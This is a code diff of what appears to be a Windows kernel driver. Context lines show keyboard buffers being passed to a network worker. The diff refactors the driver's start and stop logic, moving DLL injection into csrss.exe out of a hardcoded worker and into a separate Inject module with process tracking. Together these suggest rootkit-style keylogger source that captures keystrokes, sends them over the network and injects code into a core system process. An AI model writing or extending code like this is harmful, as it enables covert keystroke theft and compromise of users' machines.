@@ -69,17 +69,6 @@ VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry)
 	SysWorkerAddWork(&Monitor->NetWorker, MonitorSendKbdBufWorker, BuffEntry);
 }
 
-NTSTATUS MonitorInjectDllWorker(PVOID Context)
-{
-	PMONITOR Monitor = MonitorGetInstance();
-
-	UNICODE_STRING ProcPrefix = RTL_CONSTANT_STRING(L"csrss.exe");
-	UNICODE_STRING DllPath = RTL_CONSTANT_STRING(L"\\\\?\\C:\\test");
-	UNICODE_STRING DllName = RTL_CONSTANT_STRING(L"kdll.dll");
-	
-	return InjectFindAllProcessesAndInjectDll(&ProcPrefix, &DllPath, &DllName);
-}
-
 PMONITOR
 	MonitorGetInstance(VOID)
 {
@@ -90,9 +79,13 @@ VOID
 	MonitorInitInternal(PMONITOR Monitor)
 {
 	KeInitializeGuardedMutex(&Monitor->Mutex);
-	SysWorkerInit(&Monitor->InjectWorker);
+
 	SysWorkerInit(&Monitor->NetWorker);
 	SysWorkerInit(&Monitor->RequestWorker);
+
+	InjectInit(&Monitor->Inject);
+	ProcessTableInit(&Monitor->ProcessTable);
+
 	Monitor->State = MONITOR_STATE_STOPPED;
 }
 
@@ -108,7 +101,11 @@ NTSTATUS
 		return STATUS_TOO_LATE;
 	}
 
-	ProcessTableInit(&Monitor->ProcessTable);
+	Status = ProcessTableStart(&Monitor->ProcessTable);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "ProcessTableStart failed err=%x", Status);
+		goto start_failed;
+	}
 
 	Monitor->WskContext = MWskCreate();
     if (Monitor->WskContext == NULL) {
@@ -122,34 +119,33 @@ NTSTATUS
 		goto start_failed;
 	}
 
-	Status = SysWorkerStart(&Monitor->InjectWorker);
-	if (!NT_SUCCESS(Status)) {
-		KLog(LError, "SysWorkerStart failed err=%x", Status);
-		goto start_failed;
-	}
-
 	Status = SysWorkerStart(&Monitor->RequestWorker);
 	if (!NT_SUCCESS(Status)) {
 		KLog(LError, "SysWorkerStart failed err=%x", Status);
 		goto start_failed;
 	}
 
+	Status = InjectStart(&Monitor->Inject);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "InjectStart failed err=%x", Status);
+		goto start_failed;
+	}
 
-	SysWorkerAddWork(&Monitor->InjectWorker, MonitorInjectDllWorker, NULL);
 	Monitor->State = MONITOR_STATE_STARTED;
 	KeReleaseGuardedMutex(&Monitor->Mutex);
 
 	return STATUS_SUCCESS;
 
 start_failed:
+	InjectStop(&Monitor->Inject);
 	SysWorkerStop(&Monitor->RequestWorker);
-	SysWorkerStop(&Monitor->InjectWorker);
 	SysWorkerStop(&Monitor->NetWorker);
 	
 	if (Monitor->WskContext != NULL) {
 		MWskRelease(Monitor->WskContext);
 		Monitor->WskContext = NULL;
 	}
+	ProcessTableStop(&Monitor->ProcessTable);
 
 	Monitor->State = MONITOR_STATE_STOPPED;
 
@@ -168,15 +164,15 @@ NTSTATUS
 		return STATUS_TOO_LATE;
 	}
 
+	InjectStop(&Monitor->Inject);
 	SysWorkerStop(&Monitor->RequestWorker);
 	SysWorkerStop(&Monitor->NetWorker);
-	SysWorkerStop(&Monitor->InjectWorker);
 
 	if (Monitor->WskContext != NULL) {
 		MWskRelease(Monitor->WskContext);
 		Monitor->WskContext = NULL;
 	}
-	ProcessTableRelease(&Monitor->ProcessTable);
+	ProcessTableStop(&Monitor->ProcessTable);
 
 	Monitor->State = MONITOR_STATE_STOPPED;
 	KeReleaseGuardedMutex(&Monitor->Mutex);
@@ -346,6 +342,8 @@ MonitorOpenDesktop(POPEN_DESKTOP openDesktop)
 	}
 
 	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
+	SysWrkItemDeref(WrkItem);
+
 	Status = STATUS_SUCCESS;
 
 cleanup:
@@ -375,6 +373,8 @@ NTSTATUS
 	}
 
 	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
+	SysWrkItemDeref(WrkItem);
+
 	Status = STATUS_SUCCESS;
 
 cleanup:
